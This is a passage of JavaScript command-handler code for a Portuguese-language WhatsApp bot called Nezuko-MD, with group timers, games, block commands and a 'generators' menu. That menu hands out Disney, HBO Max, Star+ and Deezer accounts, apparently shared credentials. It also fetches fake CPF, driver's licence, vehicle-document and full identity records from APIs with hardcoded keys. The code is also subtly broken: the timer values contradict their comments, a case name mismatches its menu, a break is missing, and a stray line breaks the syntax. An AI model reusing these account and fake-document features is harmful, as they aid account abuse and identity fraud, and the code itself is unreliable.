{title: "[☔] 05 MINUTOS [☔]", rowId: `${prefix}grupo5m`},
{title: "[☔] 10 MINUTOS [☔]", rowId: `${prefix}grupo10m`},
{title: "[☔] 20 MINUTOS [☔]", rowId: `${prefix}grupo20m`},
{title: "[☔] 30 MINITOS [☔]", rowId: `${prefix}grupo30m`},
{title: "[☔] 01 HORA [☔]", rowId: `${prefix}grupo1h`},
{title: "[☔] 03 HORAS [☔]", rowId: `${prefix}grupo3h`},
{title: "[☔] 05 HORAS [☔]", rowId: `${prefix}grupo5h`},
{title: "[☔] 12 HORAS [☔]", rowId: `${prefix}grupo12h`}
]
},
]
 

const listMessage2 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉☔┉═══『☔』═══┉☔┉╗    
       ║                 𝗗𝗘𝗙𝗜𝗡𝗜𝗥                  ║
       ╚┉☔┉═══『☔』═══┉☔┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ☔⏝ ི⋮ ྀ  ☔ ི⋮ ྀ⏝☔ི ྀ
ㅤㅤ  ㅤ 
┠➥ *[👤] OLÁ  ADM:* ${pushname}
┠
┠➥ *AQUI ESTÃO AS OPÇÕES DE FECHAR E ABRIR O GRUPO, BASTA ESCOLHER O TEMPO*`,
  footer: `➥@daniell_dn1\n➥@daniell_dn1`,
  title: ``,
  buttonText: "[☔] TIME LIST [☔]",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
}
break


case 'grupo30s':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(30000); //30 segundos 
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo1m':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(60000); //1 Minuto
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo2m':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(120000); //2 Minutos
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo5m':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(300000); //5 Minutos
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo10m':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(600000); //10 Minutos 
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo20m':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(1200000); //20 Minutos
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo30m':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(13800000); //30 Minutos
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo1h':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(27600000); //1 Hora
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo3h':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(82800000); //3 Horas
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo5h':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(138000000); //30 segundos 
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'grupo12':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
{
nezuko.groupSettingUpdate(from, "announcement")
await sleep(331200000); //12 Horas
nezuko.groupSettingUpdate(from, "not_announcement")
}
break

case 'respaki':
if(!info.message.listResponseMessage) return
if(akinator[0][from] && akinator[0][from].player != sender) return reply('*Não é você que está jogando*')
if(args.length < 1) return 
await akinator[0][from].game.step(args[0])
if(akinator[0][from].game.progress > 85) {
    await akinator[0][from].game.win()
    teks = `Por acaso seu personagem é ${akinator[0][from].game.answers[0].name}?`
    buttons_opts = [
{buttonId: 'finaki sim', buttonText: {displayText: 'Sim'}, type: 1},
{buttonId: 'finaki nao', buttonText: {displayText: 'Não'}, type: 1},
    ]
    sendbuttonsMessage = {
image: {url: akinator[0][from].game.answers[0].absolute_picture_path},
caption: `Já sei!\n\n${teks}`,
footer: 'Sim ou não?',
buttons: buttons_opts,
headerType: 1
    }
    nezuko.sendMessage(from, sendbuttonsMessage)
} else {
    listMessage = {
text: akinator[0][from].game.question,
footer: 'Mostrar opções',
buttonText: 'Opções',
title: "Pergunta",
sections: [{
title: 'Opções',
rows: [{
rowId: `${prefix}respaki 0`,
title: 'Sim',
description: ''
},
{
rowId: `${prefix}respaki 1`,
title: 'Não',
description: ''
},{
rowId: `${prefix}respaki 2`,
title: 'Não sei',
description: ''
},{
rowId: `${prefix}respaki 3`,
title: 'Provavelmente sim',
description: ''
},
{
rowId: `${prefix}respaki 4`,
title: 'Provavelmente não',
description: ''
}]
}]
    }
    nezuko.sendMessage(from, listMessage)
}
break
case 'akinator':
buttons_opts = [
    {buttonId: 'akinator sim', buttonText: {displayText: 'Sim'}, type: 1},
    {buttonId: 'akinator nao', buttonText: {displayText: 'Não'}, type: 1},
]
sendbuttonsMessage = {
    image: fs.readFileSync('./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg'),
    caption: "Olá, sou o akinator",
    footer: 'Vamos jogar um jogo?',
    buttons: buttons_opts,
    headerType: 1
}
nezuko.sendMessage(from, sendbuttonsMessage)
break

case 'resetforca':
if(!isPlayForca) return reply(`*Você não iniciou uma partida, para iniciar dê o comando ${prefix}jogodaforca*`)
pla_pos = allForcaId.indexOf(sender)
forca.splice(pla_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Jogo da forca reiniciado com sucesso. Para iniciar outra partida dê o comando ${prefix}jogodaforca*`)
break

case 'forca':
if(!isPlayForca) return reply(`*Você não iniciou uma partida, para iniciar dê o comando ${prefix}jogodaforca*`)
if(args.length < 1) return reply(`*Dê o comando mais a letra para advinhar*`)
if(args[0].trim().length < 2) {
    p_pos = allForcaId.indexOf(sender)
    find = forca[p_pos].word.match(args[0].toLowerCase())
    is_correct = false 
    while(find != null) {
res_tmp = forca[p_pos].word.indexOf(args[0].toLowerCase())
forca[p_pos].array_under_word[res_tmp] = args[0].toLowerCase()
forca[p_pos].array_word[res_tmp] = 0
forca[p_pos].word = forca[p_pos].word.replace(args[0].toLowerCase(), 0)
find = forca[p_pos].word.match(args[0].toLowerCase())
is_correct = true
    }
    if(is_correct) {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
attempts = forca[p_pos].attempts
if(str_under == forca[p_pos].word_original) {
reply(`*Parabéns, Você venceu o jogo!✅🥳*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_`)
forca.splice(p_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
} else {
reply(`*Você acertou!✅*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
}
    } else  {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
forca[p_pos].attempts -= 1
attempts = forca[p_pos].attempts
if(forca[p_pos].attempts <= 0) {
forca.splice(p_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Você perdeu o jogo!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
} else {
reply(`*Você errou!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
}
    }
} else {
    p_pos = allForcaId.indexOf(sender)
    if(forca[p_pos].word_original == args[0].toLowerCase()) {
attempts = forca[p_pos].attempts
reply(`*Parabéns, Você venceu o jogo!✅🥳*\n\n${puppet[attempts]}\n\n_*Palavra: ${forca[p_pos].word_original.split('').join(' ')}*_`)
forca.splice(p_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
    } else {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
forca[p_pos].attempts -= 1
attempts = forca[p_pos].attempts
if(forca[p_pos].attempts <= 0) {
forca.splice(p_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Você perdeu o jogo!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
} else {
reply(`*Você errou!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
}
    }
}
break

//========AGRADECIMENTOS=============\\
case 'créditos': case 'creditos': case 'agradecimentos':
try {
ppimg = await conn.profilePictureUrl(`https://telegra.ph/file/db0956276ed548db4aa21.jpg`, 'image')
} catch {
ppimg = 'https://telegra.ph/file/db0956276ed548db4aa21.jpg'
}
const creditoos = `
   『 ᗩＧᖇᗩᗞᕮᑕIᗰᕮᘉTOS 』
┎┳━┅┅┄┈┄✧┈┈✦❖✦
┋┃ 👥 Kira
┋┃
┋┃D᥆ᥒ᥆ ᥆fιᥴιᥲᥣ: 
┋┃wa.me/556291004465
┖┻━┅┅┄┈┄✧┈┈✦❖✦`
daftarimg = await getBuffer(ppimg)
nezuko.sendMessage(from, {image: daftarimg, caption: creditoos}, {quoted: dnselo})
break


//========FIM=============\\

case 'menugerar':
var sections = [
    {
	title: "⚙️ 𝗧𝗢𝗗𝗢𝗦 𝗚𝗘𝗥𝗔𝗗𝗢𝗥𝗘𝗦 ⚙️",
	rows: [
	     {title: "🟦 Gerar Contas Da Disney 🟦", rowId: `${prefix}gerardisney`, description: "📥"},
	     {title: "🟪 Gerar Contas Da HBO MAX 🟪", rowId: `${prefix}gerarhbo`, description: "📥"},
	     {title: "🟧 Gerar Contas Da Star + 🟧", rowId: `${prefix}gerarstar`, description: "📥"},
	     {title: "⬛ Gerar Contas Da Deezer ⬛", rowId: `${prefix}gerardeezer`, description: "📥"}
		]
    },
    {
    title: "=================",
    rows: [
   {title: "↩️ Voltar ao menu", rowId: `${prefix}menu`}
   ]
   }
]

const menuu = {
  text: `by: Nezuko-MD`,
  title: `🔰𝗟𝗶𝘀𝘁𝗮 𝗚𝗲𝗿𝗮𝗱𝗼𝗿𝗲𝘀🔰\n\nMᴇɴᴜ Gᴇʀᴀᴅᴏʀᴇs ✅\n`,
  buttonText: "𝙑𝙚𝙧 𝙂𝙚𝙧𝙖𝙙𝙤𝙧𝙚𝙨",
  sections
}

const menugerar = await nezuko.sendMessage(from, menuu, {quoted: dnselo})

case 'addhbo':
if(!SoDono && !info.key.fromMe && !addcontas) return reply(enviar.msg.donosmt)
bla = hbo.includes(q)
if(bla) return reply("*Esta conta ja foi adicionada..*")  
hbo.push(`${q}`)
fs.writeFileSync('./datab/hbo.json', JSON.stringify(hbo))
nezuko.sendMessage(from, {text: `${q}\n foi adicionado à lista de hbo com sucesso`}, {quoted: info})  
break 

case 'delhbo':
if(!SoDono && !info.key.fromMe && !addcontas) return  reply(enviar.msg.donosmt)
bla = hbo.includes(q)
if(!bla) return reply("*Esta conta ja foi adicionada..*")  
pesquisar = q
processo = hbo.indexOf(pesquisar)
while(processo >= 0){
hbo.splice(processo, 1)
processo = hbo.indexOf(pesquisar)
}
fs.writeFileSync('./datab/hbo.json', JSON.stringify(hbo))
nezuko.sendMessage(from, {text: ` ${q}\n foi tirado da lista de hbo com sucesso..`}, {quoted: info})
break

case 'addstar':
if(!SoDono && !info.key.fromMe && !addcontas) return reply(enviar.msg.donosmt)
bla = star.includes(q)
if(bla) return reply("*Esta conta ja foi adicionada..*")  
star.push(`${q}`)
fs.writeFileSync('./datab/star.json', JSON.stringify(star))
nezuko.sendMessage(from, {text: `${q}\n foi adicionado à lista de star com sucesso`}, {quoted: info})  
break 

case 'delstar':
if(!SoDono && !info.key.fromMe && !addcontas) return  reply(enviar.msg.donosmt)
bla = star.includes(q)
if(!bla) return reply("*Esta conta ja foi adicionada..*")  
pesquisar = q
processo = star.indexOf(pesquisar)
while(processo >= 0){
star.splice(processo, 1)
processo = star.indexOf(pesquisar)
}
fs.writeFileSync('./datab/star.json', JSON.stringify(star))
nezuko.sendMessage(from, {text: ` ${q}\n foi tirado da lista de star com sucesso..`}, {quoted: info})
break

case 'adddeezer':
if(!SoDono && !info.key.fromMe && !addcontas) return reply(enviar.msg.donosmt)
bla = deezer.includes(q)
if(bla) return reply("*Esta conta ja foi adicionada..*")  
deezer.push(`${q}`)
fs.writeFileSync('./datab/deezer.json', JSON.stringify(deezer))
nezuko.sendMessage(from, {text: `${q}\n foi adicionado à lista de deezer com sucesso`}, {quoted: info})  
break 

case 'deldeezer':
if(!SoDono && !info.key.fromMe && !addcontas) return  reply(enviar.msg.donosmt)
bla = deezer.includes(q)
if(!bla) return reply("*Esta conta ja foi adicionada..*")  
pesquisar = q
processo = deezer.indexOf(pesquisar)
while(processo >= 0){
deezer.splice(processo, 1)
processo = deezer.indexOf(pesquisar)
}
fs.writeFileSync('./datab/deezer.json', JSON.stringify(deezer))
nezuko.sendMessage(from, {text: ` ${q}\n foi tirado da lista de deezer com sucesso..`}, {quoted: info})
break

case 'adddisney':
const totaldisneyy = disney.length
if(!SoDono && !info.key.fromMe && !addcontas) return reply(enviar.msg.donosmt)
bla = disney.includes(q)
if(bla) return reply("*Esta conta ja foi adicionada..*")  
disney.push(`${q}`)
fs.writeFileSync('./datab/disney.json', JSON.stringify(disney))
nezuko.sendMessage(from, {text: `${q}\n\n foi adicionado à lista de disney com sucesso, total de contas: ${totaldisneyy}`}, {quoted: info})  
break 

case 'deldisney':
if(!SoDono && !info.key.fromMe && !addcontas) return  reply(enviar.msg.donosmt)
bla = disney.includes(q)
if(!bla) return reply("*Esta conta ja foi adicionada..*")  
pesquisar = q
processo = disney.indexOf(pesquisar)
while(processo >= 0){
disney.splice(processo, 1)
processo = disney.indexOf(pesquisar)
}
fs.writeFileSync('./datab/disney.json', JSON.stringify(disney))
nezuko.sendMessage(from, {text: ` ${q}\n foi tirado da lista de disney com sucesso..`}, {quoted: info})
break

case 'gerardisney':
if(!SoDono) return sendBtext(from, "🛑 ️PARADO AI 🛑️", `‼️${pushname} Você não tem permissão para gerar contas‼️`, [ {buttonId: `${prefix}tchau`, buttonText: {displayText: `Ok 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`}, type: 1}], dnselo)
var contas = [ `` ]

const sortcontas = disney[Math.floor(Math.random() * disney.length)] 

sendBtext(from, `✅ DISNEY GERADA COM SUCESSO!\n️`, `${sortcontas}`, [ {buttonId: `${prefix}gerardisney ${q}`, buttonText: {displayText: `Gerar Outra Conta‼️`}, type: 1}], dnselo)

nezuko.sendMessage(nezuko.user.id, { text: `.deldisney ${sortcontas}` })

break

case 'totaldisney':
const totaldisney = disney.length
reply(`${totaldisney}`)
break

case 'gerarstar':
if(!SoDono) return sendBtext(from, "🛑 ️PARADO Ai 🛑️", `‼️${pushname} Você não tem permissão para gerar contas‼️`, [ {buttonId: `${prefix}tchau`, buttonText: {displayText: `Ok 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`}, type: 1}], dnselo)
var contas = [ `` ]

const sortcontas2 = star[Math.floor(Math.random() * star.length)] 

sendBtext(from, `✅ STAR + GERADA COM SUCESSO!\n️`, `${sortcontas2}`, [ {buttonId: `${prefix}gerarstar ${q}`, buttonText: {displayText: `Gerar Outra Conta‼️`}, type: 1}], dnselo)
break

case 'gerarhbo':
if(!SoDono) return sendBtext(from, "🛑 ️PARADO Ai 🛑️", `‼️${pushname} Você não tem permissão para gerar contas‼️`, [ {buttonId: `${prefix}tchau`, buttonText: {displayText: `Ok 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`}, type: 1}], dnselo)
var contas = [ `` ]

const sortcontas3 = hbo[Math.floor(Math.random() * hbo.length)] 

sendBtext(from, `✅ HBO MAX GERADA COM SUCESSO!\n️`, `${sortcontas3}`, [ {buttonId: `${prefix}gerarhbo ${q}`, buttonText: {displayText: `Gerar Outra Conta‼️`}, type: 1}], dnselo)
break

case 'gerardeezer':
if(!SoDono) return sendBtext(from, "🛑 ️PARADO Ai 🛑️", `‼️${pushname} Você não tem permissão para gerar contas‼️`, [ {buttonId: `${prefix}tchau`, buttonText: {displayText: `Ok 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`}, type: 1}], dnselo)
var contas = [ `` ]

const sortcontas4 = deezer[Math.floor(Math.random() * deezer.length)] 

sendBtext(from, `✅ DEEZER GERADA COM SUCESSO!\n️`, `${sortcontas4}`, [ {buttonId: `${prefix}gerardeezer ${q}`, buttonText: {displayText: `Gerar Outra Conta‼️`}, type: 1}], dnselo)
break

case 'gerarcpf':
if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/gerarcpf?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE CPF* ⚙
➸ CPF: ${send.CPF}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break
					
case 'gerarcnpj':
if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/gerarcnpj?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE CNPJ* ⚙
➸ CNPJ: ${send.certidao}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

case 'gerarcertidão': 
case 'gerarcertidao':
if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/gerarcertidao?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE CERTIDÃO* ⚙
➸ CERTIDÃO: ${send.certidao}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

case 'gerarcnh':
if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/gerarcnh?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE CNH* ⚙
➸ CNH: ${send.CNH}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

case 'gcrlv':
case 'gerarcrlv':
try {
if (!isPremium) return reply(mess.msg.premium)
reply('*Estou gerando, se der erro tente novamente ✓*')
anu = await fetchJson(`http://brizas-api.herokuapp.com/gerador/crlv?apikey=brizaloka`)
crlv = `⚙ *GERADOR DOCUMENTO DE VEÍCULO* ⚙

➸ *PLACA:* ${anu.result.placa}
➸ *CHASSI:* ${anu.result.chassi}
➸ *MARCA:* ${anu.result.marca}
➸ *MODELO:* ${anu.result.modelo}
➸ *CATEGORIA:* ${anu.result.categoria}
➸ *ESPÉCIE:* ${anu.result.especie}
➸ *RESTRIÇÃO:* ${anu.result.restricao}
➸ *TIPO:* ${anu.result.tipo}
➸ *CARROCERIA:* ${anu.result.carroceria}
➸ *COMBUSTÍVEL:* ${anu.result.combustivel}
➸ *COR:* ${anu.result.cor}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: crlv}, {quoted: info})
} catch (err) {
console.error(err)
reply(`*• NÃO FOI POSSÍVEL GERAR!*`)
}
break

case 'gerarrenavam':
if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/gerarrenavam?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE RENAVAM* ⚙

➸ RENAVAM: ${send.RENAVAM}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

case 'gerarprocesso':
if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/gerarprocesso?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE PROCESSO* ⚙
➸ NÚMERO DO PROCESSO: ${send.processo_judicial}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

case 'gerarcnae':
if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/gerarcnae?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE CNAE* ⚙
➸ NÚMERO DO PROCESSO: ${send.CNAE}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

case 'gerarpessoa': 
if(!isPremium) return reply(enviar.msg.premium)
send = await fetchJson(`https://apirest.gestorvip.com/api/gerarpessoa?apikey=Toms123`)
teks = `⚙ *GERADOR DE PESSOA* ⚙

➸ NOME: ${send.nome}
➸ CPF: ${send.cpf}
➸ CEP: ${send.cep}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
break

case 'gerarpessoa2': 
if(!isPremium) return reply(enviar.msg.premium)
send = await fetchJson(`https://apirest.gestorvip.com/api/gerarpessoa2?apikey=Toms123`)
teks = `⚙ *GERADOR DE PESSOA* ⚙

➸ NOME: ${send.nome}
➸ MÃE: ${send.mae}
➸ CPF: ${send.cpf}
➸ NASCIMENTO: ${send.nascimento}
➸ CEP: ${send.cep}
➸ COMPLEMENTO: ${send.complemento}
➸ BAIRRO: ${send.bairro}
➸ MUNICÍPIO: ${send.municipio}
➸ SIGLA DO ESTADO: ${send.uf}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
break

case 'gerarpessoa3':
try {
if (!isPremium) return reply(mess.msg.premium)
anu = await fetchJson(`http://brizas-api.herokuapp.com/gerador/pessoa?apikey=brizaloka`)
gerarpessoa= `⚙ *GERADOR DE PESSOA* ⚙

➸ *NOME:* ${anu.resultado.nome}
➸ *NOME DA MÃE:* ${anu.resultado.mae}
➸ *NOME DO PAI:* ${anu.resultado.pai}
➸ *RG:* ${anu.resultado.RG}
➸ *CPF:* ${anu.resultado.CPF}
➸ *NÚMERO DE TELEFONE:* ${anu.resultado.telefonde}
➸ *DATA DE NASCIMENTO:* ${anu.resultado.nascimento}
➸ *SIGNO:* ${anu.resultado.signo}
➸ *ALTURA:* ${anu.resultado.altura}
➸ *CIDADE:* ${anu.resultado.endereco.cidade}
➸ *BAIRRO:* ${anu.resultado.endereco.bairro}
➸ *ESTADO:*${anu.resultado.endereco.estado}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: gerarpessoa}, {quoted: info})
} catch (err) {
console.error(err)
reply(`*• NÃO FOI POSSÍVEL GERAR!*`)
}
break

case 'gempresa':
case 'gerarempresa':
try {
if (!isPremium) return reply(mess.msg.premium)
anu = await fetchJson(`http://brizas-api.herokuapp.com/gerador/empresa?apikey=brizaloka`)
gerarpessoa= `⚙ *GERADOR DE EMPRESA* ⚙

➸ *Nome:* ${anu.result.nome}
➸ *E-mail:* ${anu.result.email}
➸ *INSCRIÇÃO ESTADUAL:* ${anu.result.inscricaoestadual}
➸ *CNPJ:* ${anu.result.cnpj}
➸ *CEP:* ${anu.result.endereco.cep}
➸ *LOGRADOURO:* ${anu.result.endereco.logradouro}
➸ *COMPLEMENTO:* ${anu.result.endereco.complemento}
➸ *NÚMERO:* ${anu.result.endereco.numero}
➸ *BAIRRO:* ${anu.result.endereco.bairro}
➸ *CIDADE:* ${anu.result.endereco.cidade}
➸ *ESTADO:* ${anu.result.endereco.estado}
➸ *ESTADO SIGLA:* ${anu.result.endereco.estadoSigla}
➸ *TELEFONE:* ${anu.result.telefone}
➸ *CELULAR:* ${anu.result.celular}
➸ *DATA DE ABERTURA:* ${anu.result.dataAbertura}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: gerarpessoa}, {quoted: info})
} catch (err) {
console.error(err)
reply(`*NÃO FOI POSSÍVEL GERAR!*`)
}
break

case 'gerarcarro':
if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/gerarcarro?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE CARRO* ⚙

Modelo: ${send.result.modelo}
Marca: ${send.result.marca}
Cor: ${send.result.cor}
Placa: ${send.result.placa}
Chassi: ${send.result.chassi}
Categoria: ${send.result.categoria}
Especie: ${send.result.especie}
Restrição: ${send.result.restricao}
Tipo: ${send.result.tipo}
Carroceria: ${send.result.carroceria}
Combustível: ${send.result.combustivel}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

                    case 'dadosfake':
                    if (!isPremium) return reply(mess.msg.premium)
                    send = await fetchJson(`https://nezsab-apis.xyz/api/dadosfake?apikey=${keyapi}`)
                    teks = `⚙ *GERADOR DE DADOS* ⚙

Nome: ${send.resultado.nome}
Mãe: ${send.resultado.mae}
Pai: ${send.resultado.pai}
Rg: ${send.resultado.RG}
Cpf: ${send.resultado.CPF}
Telefone: ${send.resultado.telefonde}
Signo: ${send.resultado.signo}
Altura: ${send.resultado.altura}
Peso: ${send.resultado.peso}
Tipo Sanguíneo: ${send.resultado.tipoSanguineo}
Cep: ${send.resultado.endereco.cep}
Lagradouro: ${send.resultado.endereco.logradouro}
Complemento: ${send.resultado.endereco.complemento}
Número: ${send.resultado.endereco.numero}
Bairro: ${send.resultado.endereco.bairro}
Cidade: ${send.resultado.endereco.cidade}
Estado: ${send.resultado.endereco.estado}
Sigla do estado: ${send.resultado.endereco.estadoSigla}

🔛 *BY:* Nezuko-MD`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

//======================================\\

case 'blockpv': {
reply(`<❗> Usuario bloqueado com sucesso.`)
                if (!SoDono) return reply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (users === '@s.whatsapp.net') return reply('Marca Alguem ou coloca o numero')
                if (users.length < 20) return reply('Insira um Numero Valido')
                if (botNumber.includes(users)) return reply('Não sou besta de banir eu mesmo né 🙁, mas estou decepcionado com você')
                if (numerodonos.includes(users)) return reply('Não posso banir meu dono 🤧')
                try {
                    await nezuko.updateBlockStatus(users, 'block')
                } catch {
                    await reply('erro ao banir')
                }
            }
                break

case 'unblockpv': {
            reply(`<❗> Usuario desbloqueado com sucesso.`)
                if (!SoDono) return reply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (users === '@s.whatsapp.net') return reply('Marca Alguem ou coloca o numero')
                if (users.length < 20) return reply('Insira um Numero Valido')
                if (botNumber.includes(users)) return reply('Como eu vou me desbanir Jegue?')
                try {

                    await nezuko.updateBlockStatus(users, 'unblock')
                } catch {
                    await reply('Erro ao Desbanir')
                }
            }
                break

case 'blocklist':
if (!SoDono  && !isnit) return reply(enviar.msg.donosmt)
jrc = 'ESTA É A LISTA DE NÚMEROS BLOQUEADOS :\n'
for (let benn of ban) {
jrc += `~> @${benn.split('@')[0]}\n`
}
jrc += `Total : ${ban.length}`
nezuko.sendMessage(from, {text: jrc.trim(), mentions: ban})
break
__________________________________________

case 'cantada': //by Carlos
reply(`*Ei ${pushname} já estou fazendo a sua cantada...* Enquanto isso tome um café☕`)
sendee = await axios.get(`https://lzmods-api.tk/api/tools/cantadas?apikey=lz`)
cantada = `*Conquista a novinha com essa:* ${sendee.data.resultado.cantada}`
nezuko.sendMessage(from, {text: cantada}, {quoted: dnselo})
break

case 'cantada2':
case 'cantadas': {
var pipoquinha = cantadas[Math.floor(Math.random() * cantadas.length)]   
let buttonss = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: ' Proxima Cantada '}, type: 1}]
                let bb = {
                    text: `*Uma cantada para conquistar a novinha:* ${pipoquinha}`,
                    footer: `Usuario: ${pushname}\nBot: ${NomeDoBot}`,
                   buttons: buttonss,
                   headerType: 2
                }
                nezuko.sendMessage(from, bb, {quoted: dnselo})
            }
break

case 'fuckmylife': {
api = await fetchJson(`http://nezsab-api2.herokuapp.com/api/fuckmylife?apikey=${keyapi}`)
let buttonss = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐎-𝐑𝐄𝐋𝐀𝐓𝐎😱'}, type: 1}]
                let bb = {
                    text: `${api.resultado}.`,
                    footer: `Usuário: ${pushname}\nBot: ${NomeDoBot}`,
                   buttons: buttonss,
                   headerType: 2
                }
                nezuko.sendMessage(from, bb, {quoted: dnselo})
            }
break

case 'jogodaforca':
if(isPlayForca) return reply(`*Termine a partida iniciada para jogar uma nova, ou dê o comando ${p}resetforca*`)
if (!isGame) return reply(mensagem[0].game);
word_correct = (await randompalavra()).slice(1).normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase()
under_word = '-'.repeat(word_correct.length)
forca.push({
    id: sender,
